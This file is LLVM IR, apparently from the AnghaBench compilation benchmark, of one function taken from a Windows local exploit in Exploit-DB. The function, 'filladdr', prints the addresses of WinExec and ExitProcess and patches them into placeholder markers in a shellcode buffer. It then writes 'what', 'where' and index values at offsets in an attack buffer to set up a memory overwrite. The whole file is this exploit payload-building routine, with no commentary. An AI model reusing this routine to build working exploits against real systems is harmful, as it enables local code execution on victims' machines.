; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_272.c_filladdr.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_272.c_filladdr.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@INDEX = common dso_local global i32 0, align 4
@IDXOFF = common dso_local global i32 0, align 4
@WinExec = common dso_local global i64 0, align 8
@ExitProcess = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [28 x i8] c"-> WinExec() is at: 0x%08x\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"-> ExitProcess() is at: 0x%08x\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [37 x i8] c"-> Filling in WinExec at offset: %d\0A\00", align 1
@.str.3 = private unnamed_addr constant [41 x i8] c"-> Filling in ExitProcess at offset: %d\0A\00", align 1
@buff = common dso_local global i8* null, align 8
@HSIZE = common dso_local global i32 0, align 4
@OFFSET = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"-> 'what' == 0x%08x at offset %d\0A\00", align 1
@what = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [35 x i8] c"-> 'where' == 0x%08x at offset %d\0A\00", align 1
@where = common dso_local global i32 0, align 4
@RANGE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [35 x i8] c"-> 'index' == 0x%08x at offset %d\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @filladdr() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  store i32 0, i32* %2, align 4
  %7 = load i32, i32* @INDEX, align 4
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* @IDXOFF, align 4
  store i32 %8, i32* %4, align 4
  %9 = load i64, i64* @WinExec, align 8
  store i64 %9, i64* %5, align 8
  %10 = load i64, i64* @ExitProcess, align 8
  store i64 %10, i64* %6, align 8
  %11 = load i64, i64* %5, align 8
  %12 = trunc i64 %11 to i32
  %13 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i32 %12)
  %14 = load i64, i64* %6, align 8
  %15 = trunc i64 %14 to i32
  %16 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i32 %15)
  %17 = load i8*, i8** @shellcode, align 8
  store i8* %17, i8** %1, align 8
  br label %18

18:                                               ; preds = %55, %0
  %19 = load i8*, i8** %1, align 8
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = icmp ne i32 %21, 0
  br i1 %22, label %23, label %58

23:                                               ; preds = %18
  %24 = load i8*, i8** %1, align 8
  %25 = bitcast i8* %24 to i64*
  %26 = load i64, i64* %25, align 8
  %27 = icmp eq i64 %26, 1482184792
  br i1 %27, label %28, label %39

28:                                               ; preds = %23
  %29 = load i8*, i8** %1, align 8
  %30 = load i8*, i8** @shellcode, align 8
  %31 = ptrtoint i8* %29 to i64
  %32 = ptrtoint i8* %30 to i64
  %33 = sub i64 %31, %32
  %34 = trunc i64 %33 to i32
  %35 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i32 %34)
  %36 = load i64, i64* %5, align 8
  %37 = load i8*, i8** %1, align 8
  %38 = bitcast i8* %37 to i64*
  store i64 %36, i64* %38, align 8
  br label %39

39:                                               ; preds = %28, %23
  %40 = load i8*, i8** %1, align 8
  %41 = bitcast i8* %40 to i64*
  %42 = load i64, i64* %41, align 8
  %43 = icmp eq i64 %42, 1499027801
  br i1 %43, label %44, label %55

44:                                               ; preds = %39
  %45 = load i8*, i8** %1, align 8
  %46 = load i8*, i8** @shellcode, align 8
  %47 = ptrtoint i8* %45 to i64
  %48 = ptrtoint i8* %46 to i64
  %49 = sub i64 %47, %48
  %50 = trunc i64 %49 to i32
  %51 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i32 %50)
  %52 = load i64, i64* %6, align 8
  %53 = load i8*, i8** %1, align 8
  %54 = bitcast i8* %53 to i64*
  store i64 %52, i64* %54, align 8
  br label %55

55:                                               ; preds = %44, %39
  %56 = load i8*, i8** %1, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %1, align 8
  br label %18

58:                                               ; preds = %18
  %59 = load i8*, i8** @buff, align 8
  %60 = load i32, i32* @HSIZE, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* @OFFSET, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  store i8* %65, i8** %1, align 8
  %66 = load i32, i32* @what, align 4
  %67 = load i32, i32* @OFFSET, align 4
  %68 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0), i32 %66, i32 %67)
  %69 = load i32, i32* @what, align 4
  %70 = sext i32 %69 to i64
  %71 = load i8*, i8** %1, align 8
  %72 = bitcast i8* %71 to i64*
  store i64 %70, i64* %72, align 8
  %73 = load i8*, i8** %1, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 4
  store i8* %74, i8** %1, align 8
  %75 = load i32, i32* @where, align 4
  %76 = load i32, i32* @OFFSET, align 4
  %77 = add nsw i32 %76, 4
  %78 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.5, i64 0, i64 0), i32 %75, i32 %77)
  %79 = load i32, i32* @where, align 4
  %80 = sub nsw i32 %79, 4
  %81 = sext i32 %80 to i64
  %82 = load i8*, i8** %1, align 8
  %83 = bitcast i8* %82 to i64*
  store i64 %81, i64* %83, align 8
  %84 = load i8*, i8** @buff, align 8
  %85 = load i32, i32* @HSIZE, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load i32, i32* %4, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  store i8* %90, i8** %1, align 8
  br label %91

91:                                               ; preds = %112, %58
  %92 = load i32, i32* %2, align 4
  %93 = load i32, i32* @RANGE, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %115

95:                                               ; preds = %91
  %96 = load i32, i32* %3, align 4
  %97 = load i32, i32* %2, align 4
  %98 = sub nsw i32 %96, %97
  %99 = load i32, i32* %4, align 4
  %100 = load i32, i32* %2, align 4
  %101 = add nsw i32 %99, %100
  %102 = call i32 (i8*, i32, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0), i32 %98, i32 %101)
  %103 = load i32, i32* %3, align 4
  %104 = load i32, i32* %2, align 4
  %105 = sub nsw i32 %103, %104
  %106 = sext i32 %105 to i64
  %107 = load i8*, i8** %1, align 8
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = bitcast i8* %110 to i64*
  store i64 %106, i64* %111, align 8
  br label %112

112:                                              ; preds = %95
  %113 = load i32, i32* %2, align 4
  %114 = add nsw i32 %113, 4
  store i32 %114, i32* %2, align 4
  br label %91

115:                                              ; preds = %91
  ret void
}

declare dso_local i32 @printf(i8*, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
